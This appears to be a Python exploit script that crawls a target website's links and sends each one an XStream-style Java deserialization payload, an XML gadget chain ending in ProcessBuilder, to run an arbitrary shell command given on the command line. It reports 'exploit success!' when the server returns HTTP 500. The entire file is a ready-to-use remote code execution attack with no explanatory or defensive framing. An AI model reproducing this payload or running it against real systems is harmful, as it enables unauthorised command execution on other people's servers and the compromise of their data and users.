import requests
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument('url',help='Target url')
parser.add_argument('cmd',help='Run command')
args = parser.parse_args()

list = []

def spider(url):

	global list

	r = requests.get(url)
	
	html = r.text
	
	links = re.findall(r'(?<=href=\").+?(?=\")',html)
	
	for u in links:

		if not re.findall(url,u):
		
			list.append(url + str(u))
		
		else:
		
			list.append(u)

def attack(cmd):

	global list
	
	for u in list:
	
		url = u

		headers = {"Content-Type":"application/xml"}

		cmd = cmd

		data = '''<map> 
		<entry> 
		<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>{cmd}</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
		</entry> 
		</map> 
		'''.format(cmd=cmd)

		r = requests.get(url,data=data,headers=headers)

		if r.status_code == 500:
		
			print 'exploit success!'
			
		else:
		
			print 'exploit fail'

if args.url and args.cmd:

	spider(args.url)
	attack(args.cmd)